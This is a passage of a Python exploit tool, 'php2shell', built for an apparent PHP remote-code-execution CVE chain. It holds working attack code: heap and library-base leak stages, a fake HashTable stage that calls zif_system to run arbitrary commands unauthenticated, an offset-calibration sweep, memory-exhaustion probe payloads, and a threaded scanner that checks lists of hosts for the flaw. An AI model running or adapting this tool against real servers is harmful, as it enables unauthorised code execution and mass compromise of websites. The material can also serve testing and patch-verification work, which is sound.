    if args.docker_container:
        remote = args.proof_remote or cmd_artifact(cmd) or "/out/p1"
        r = subprocess.run(["docker", "exec", args.docker_container, "cat", remote],
                           capture_output=True)
        return r.stdout if r.returncode == 0 else b""
    if not args.proof_file:
        return b""
    try:
        with open(args.proof_file, "rb") as f:
            return f.read()
    except OSError:
        return b""


def wait_alive(ui, t, tries=4, delay=3.0):
    """The single-worker targets this chain needs can wedge (hung child, not a
    dead one), so the master never forks a replacement. Poll before each arm."""
    for i in range(tries):
        status, _h, _b = t.head(t.path or "/", timeout=4.0)
        if status:
            return True
        if i < tries - 1:
            ui.warn("WORKER", f"no response, retry in {delay:.0f}s ({i + 1}/{tries})")
            time.sleep(delay)
    return False


def run_rce(ui, args):
    t = Target(args.url)
    phpver, _server = fingerprint(ui, t)
    off, prof = preflight(ui, args, phpver, t.port, _server)
    if args.no_carrier:
        prof = dict(prof, carrier=False)
        ui.info("GEOMETRY", "stage3 carrier disabled")
    if getattr(args, "amp", 0):
        prof = dict(prof, amp=args.amp)
        ui.info("PRESSURE", f"nested empty-file amplifier x{args.amp} parts")
    ex = Exploit(ui, t, args.cmd, off, prof)

    # a stale proof file from an earlier run would fake a success
    if args.docker_container:
        subprocess.run(["docker", "exec", args.docker_container, "rm", "-f",
                        args.proof_remote or cmd_artifact(args.cmd) or "/out/p1"],
                       capture_output=True)
    elif args.proof_file and os.path.exists(args.proof_file):
        os.remove(args.proof_file)

    ui.stage("EXECUTE", "run unauthenticated request sequence")
    for attempt in range(1, args.attempts + 1):
        # A single-worker target can be left hung by a failed arm: the master
        # forks a replacement for a dead child, not for a hung one. Check
        # liveness before spending another attempt.
        if not wait_alive(ui, t):
            ui.fail("WORKER", "target stopped responding; the single worker looks wedged")
            ui.kv("fix", "restart the worker (docker restart / pm.max_requests=1 / MaxConnectionsPerChild=1)")
            break
        ui.info("ATTEMPT", f"{attempt}/{args.attempts} worker rotation")
        ex.rotate()
        chunk = ex.stage1()
        if not chunk:
            ui.fail("LEAK 1/2", "chunk base not disclosed")
            continue
        ui.ok("HEAP BASE", f"chunk=0x{chunk:x}")
        ex.rotate()
        base = ex.stage2()
        if not base:
            ui.fail("LEAK 2/2", "libphp base not disclosed")
            continue
        ui.ok("IMAGE BASE", f"libphp=0x{base:x} · zif_system=0x{base + off['zif']:x}")
        ex.rotate()
        htdata = chunk + prof["htdata"]
        ui.info("FIRE", f"HTDATA=0x{htdata:x} ZIF=0x{base + off['zif']:x}")
        ex.stage3(htdata, base + off["zif"])
        time.sleep(args.settle)
        out = prove(args, args.cmd).decode("latin1").strip()
        if out:
            ui.output(out)
            ui.info("TRAFFIC", f"sent={t.sent / 1e6:.2f}MB recv={t.recv / 1e6:.2f}MB")
            ui.progress("verification output received", time.monotonic() - ui.t0)
            return 0
        ui.fail("FIRE", f"attempt {attempt}: command did not execute")
    ui.die("exploit failed: target did not yield a shell")


def run_calibrate(ui, args):
    if not args.range:
        ui.die("calibrate needs --range LO:HI:STEP")
    t = Target(args.url)
    phpver, _ = fingerprint(ui, t)
    off, prof = preflight(ui, args, phpver, t.port, _server)
    lo, hi, step = [int(x, 0) for x in args.range.split(":")]
    total = (hi - lo) // step + 1
    ui.stage("CALIBRATE", f"sweep htdata over {total} slots")
    ex = Exploit(ui, t, args.cmd, off, prof)
    ui.info("RANGE", f"{lo:#x}..{hi:#x} step {step:#x} ({total} fires)")

    def hit(ht, out):
        ui.ok("HIT", f"htdata=chunk+{ht:#x} command={out!r}")
        key = profile_key(phpver, off["zif"], off["dtor"])
        cache = load_profiles()
        cache[key] = {"name": f"htdata=chunk+{ht:#x}", "htdata": ht,
                      "stage1_n": prof["stage1_n"], "stage2_t": prof["stage2_t"],
                      "stage2_v": prof["stage2_v"], "pads": prof["pads"],
                      "carrier": prof["carrier"], "php": phpver,
                      "zif": off["zif"], "dtor": off["dtor"],
                      "found_at": time.strftime("%Y-%m-%dT%H:%M:%S")}
        save_profiles(cache)
        ui.output(out)
        ui.info("PROFILE SAVED", f"{PROFILE_FILE} :: {key}")

    def proof():
        return prove(args, args.cmd).decode("latin1").strip()

    # 1) base profile first: a correct geometry also misses on a bad arm, so retry
    ui.info("BASELINE", f"trying built-in offset chunk+{prof['htdata']:#x} before sweeping")
    for attempt in range(1, args.attempts + 1):
        ex.rotate()
        chunk = ex.stage1()
        if not chunk:
            ui.fail("LEAK 1/2", f"baseline attempt {attempt}: chunk base not disclosed")
            continue
        ex.rotate()
        base = ex.stage2()
        if not base:
            ui.fail("LEAK 2/2", f"baseline attempt {attempt}: libphp base not disclosed")
            continue
        ex.rotate()
        ex.stage3(chunk + prof["htdata"], base + off["zif"])
        time.sleep(args.settle)
        out = proof()
        if out:
            hit(prof["htdata"], out)
            return 0
        ui.fail("BASELINE", f"attempt {attempt}/{args.attempts} no execution")

    # 2) sweep: the heap base of a prefork child is inherited from the master, so
    #    it is stable across worker rotations - leak once, then only re-arm + fire
    chunk = base = 0
    for _ in range(args.attempts):
        ex.rotate()
        chunk = ex.stage1()
        if chunk:
            ex.rotate()
            base = ex.stage2()
        if chunk and base:
            break
    if not (chunk and base):
        ui.die("could not get both leaks, nothing to sweep against")
    ui.info("ANCHORS", f"chunk=0x{chunk:x} libphp=0x{base:x} (stable across forks)")
    ui.info("SWEEP", f"{total} candidates at ~1 arm each")

    for n, ht in enumerate(range(lo, hi + 1, step), 1):
        if n == 1 or n % 16 == 0 or n == total:
            rate = (time.monotonic() - ui.t0) / max(n, 1)
            ui.step("STEP", "sweep", f"{n}/{total} htdata=chunk+{ht:#x} · {rate:.1f}s per fire")
        ex.rotate()
        ex.stage3(chunk + ht, base + off["zif"])
        time.sleep(args.settle)
        out = proof()
        if out:
            hit(ht, out)
            return 0
    ui.die("calibration exhausted: no htdata hit in range")


def build_probe_body(size_mib, parts):
    """Assetnote-style amplification: empty-filename upload parts with deeply
    nested keys. Each part expands into six $_FILES entries with a deep
    hierarchy, so ~1 MiB of wire can exhaust a 128M memory_limit."""
    size = size_mib << 20
    name = b"a[]" + b"[a]" * 62
    part = b"--\nContent-Disposition:name=" + name + b";filename=\n\n"
    base = part * parts
    if size < len(base):
        raise ValueError(f"{size_mib}MiB cannot hold {parts} parts ({len(base)}B)")
    filler = (size - len(base)) // 3
    body = b"--\n" + (b"x:\n" * filler) + base[3:]
    return body[:-1]


SIGN_MEMFATAL = (b"Allowed memory size of", b"bytes exhausted", b"Unknown")


def scan_target(url, timeout_control=20.0, timeout_probe=60.0):
    """Detection only. Returns a dict; never exploits."""
    t = Target(url)
    status, headers, _body = t.head(t.path or "/", timeout=8.0)
    h = {k.lower(): v for k, v in headers.items()}
    server = h.get("server", "")
    phpver = ""
    m = re.search(r"PHP/([0-9][0-9.]*)", h.get("x-powered-by", "") + " " + server)
    if m:
        phpver = m.group(1)
    res = {"url": url, "status": status, "server": server, "php": phpver,
           "verdict": "unreachable" if not status else "inconclusive",
           "mode": "", "why": "", "probe": "", "signal": ""}
    if not status:
        return res

    control = t.post(b"--x\nContent-Disposition:name=a;filename=\n\n", b"",
                     read_cap=1 << 16, timeout=timeout_control)
    for size_mib, parts, chunked in ((1, 4000, False), (8, 1020, False), (20, 1020, True)):
        body_p = build_probe_body(size_mib, parts)
        resp = (t.post_chunked(body_p, b"", read_cap=1 << 20, timeout=timeout_probe) if chunked
                else t.post(body_p, b"", read_cap=1 << 20, timeout=timeout_probe))
        st = resp.split(b" ")[1][:3].decode("latin1") if resp else "none"
        bp = resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""
        res["probe"] = f"{size_mib}MiB/{parts}{'/chunked' if chunked else ''} status={st} body={len(bp)}B"
        if all(sig in bp for sig in SIGN_MEMFATAL):
            res.update(verdict="vulnerable", mode="mod_php" if "fpm" not in server.lower() else "fpm",
                       signal="memfatal",
                       why="in-band PHP fatal: memory exhausted in Unknown while parsing the multipart body")
            return res
        if st == "500" and control and not bp:
            res.update(verdict="vulnerable", mode="mod_php", signal="empty-500",
                       why="HTTP 500 with empty body while the control request produced output")
            return res
        if st in ("502", "503", "504"):
            res.update(verdict="vulnerable", mode="fpm", signal=f"fpm-{st}",
                       why=f"HTTP {st} from the fronting web server (worker died mid-request)")
            return res
    if phpver:
        fixed = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
        pp = phpver.split(".")
        if len(pp) >= 3 and f"{pp[0]}.{pp[1]}" in fixed:
            if int(pp[2]) < fixed[f"{pp[0]}.{pp[1]}"]:
                res.update(verdict="vulnerable", mode="version", signal="version<fix",
                           why=f"PHP {phpver} is below the fixed release (no crash signal)")
            else:
                res.update(verdict="fixed", mode="version", signal="version>=fix",
                           why=f"PHP {phpver} at or above the patched release")
    return res


def run_scan(ui, args):
    """scan one URL or a list; threads; optional JSON."""
    urls = []
    if getattr(args, "list", None):
        with open(args.list) as f:
            urls += [l.strip() for l in f if l.strip() and not l.startswith("#")]
    if args.url:
        urls.append(args.url)
    if not urls:
        ui.die("scan needs a URL or -l hosts.txt")
    urls = list(dict.fromkeys(urls))
    ui.stage("SCAN", f"memory-pressure probes on {len(urls)} target(s)")

    def vcol(verdict):
        cmap = {"vulnerable": ui.RED + ui.BOLD, "fixed": ui.GREEN + ui.BOLD,
                "inconclusive": ui.YELLOW, "unreachable": ui.DIM}
        return ui.c(f"{verdict:<12s}", cmap.get(verdict, ui.WHITE))

    results = []
    show_progress = len(urls) > 20
    if len(urls) == 1 or args.threads <= 1:
        for u in urls:
            r = scan_target(u)
            results.append(r)
            if show_progress:
                ui.step("STEP", "scanned", f"{vcol(r['verdict'])} {u}")
    else:
        from concurrent.futures import ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            for r in pool.map(scan_target, urls):
                results.append(r)
                if show_progress:
                    ui.step("STEP", "scanned", f"{vcol(r['verdict'])} {r['url']}")

    print()
    print(f"{'URL':<44s} {'VERDICT':<12s} {'MODE':<8s} {'PHP':<8s} SIGNAL")
    for r in sorted(results, key=lambda x: {"vulnerable": 0, "inconclusive": 1, "fixed": 2, "unreachable": 3}.get(x["verdict"], 9)):
        print(f"{r['url'][:44]:<44s} {vcol(r['verdict'])} {r['mode'] or '-':<8s} {r['php'] or '-':<8s} {r['signal'] or '-'}")
    vuln = [r for r in results if r["verdict"] == "vulnerable"]
    print()
    ui.info("SUMMARY", f"{len(vuln)}/{len(results)} vulnerable"
                        + (f", {len([r for r in results if r['verdict'] == 'fixed'])} fixed" if any(r['verdict'] == 'fixed' for r in results) else ""))

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        ui.info("SAVED", args.output)
    return 0 if vuln else 1


def main():
    ap = argparse.ArgumentParser(
        prog="php2shell",
        description=f"PHP2SHELL - CVE-2026-109618/109619 remote chain - exploit by {AUTHOR} v{VERSION}")
    ap.add_argument("action", choices=("scan", "rce", "calibrate"), help="scan = detect only, rce = fire, calibrate = find htdata")
    ap.add_argument("url", nargs="?", help="target URL, e.g. http://host/index.php")
    ap.add_argument("-c", "--cmd", default="id>/out/p",
                    help=f"command, <= {MAX_CMD} bytes (default 'id>/out/p')")
    ap.add_argument("--proof-file", help="local path of the file the command writes on target")
    ap.add_argument("--proof-remote", help="path of that file inside the target container (default /out/<name>)")
    ap.add_argument("--libphp", help="target libphp.so (offsets read from it)")
    ap.add_argument("--docker-container", help="container holding the target libphp.so")
    ap.add_argument("--profile", default="auto", choices=("auto", "bookworm"),
                    help="heap geometry profile (auto = built-in/cache)")
    ap.add_argument("--zif", type=lambda x: int(x, 0), default=BOOKWORM and 0x465370)
    ap.add_argument("--dtor", type=lambda x: int(x, 0), default=0x65EB60)
    ap.add_argument("--htdata", type=lambda x: int(x, 0), help="chunk-relative fake HashTable offset")
    ap.add_argument("--no-carrier", action="store_true", help="stage3 without the 15-byte carrier (ref parts instead)")
    ap.add_argument("--amp", type=int, default=0, help="memory pressure via N nested empty-file parts (0 = classic 12MB blob)")
    ap.add_argument("--range", help="calibrate sweep, e.g. 0x68d000:0x696000:0x8")
    ap.add_argument("--attempts", type=int, default=3)
    ap.add_argument("--settle", type=float, default=0.4, help="seconds to wait before reading the proof file")
    ap.add_argument("-l", "--list", help="file with one URL per line (scan mode)")
    ap.add_argument("-t", "--threads", type=int, default=8, help="scan threads (default 8)")
    ap.add_argument("-o", "--output", help="write JSON results here (scan mode)")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    ui = UI(color=not args.no_color)
    ui.banner()
    if args.action == "scan":
        n = 1
        if getattr(args, "list", None):
            try:
                n = len([l for l in open(args.list) if l.strip() and not l.startswith("#")])
            except OSError:
                n = 0
        ui.chain(f"{args.list} ({n} targets)" if args.list else args.url,
                 subtitle="Detection only - memory-pressure probes, no exploitation")
    else:
        ui.chain(args.url, args.cmd)
    if args.action == "scan":
        return run_scan(ui, args)
    if not args.url:
        ui.die(f"{args.action} needs a URL")
    if args.action == "calibrate":
        if not (args.proof_file or args.docker_container):
            ui.die("calibrate needs --proof-file or --docker-container")
        return run_calibrate(ui, args)
    return run_rce(ui, args)


if __name__ == "__main__":
    sys.exit(main())
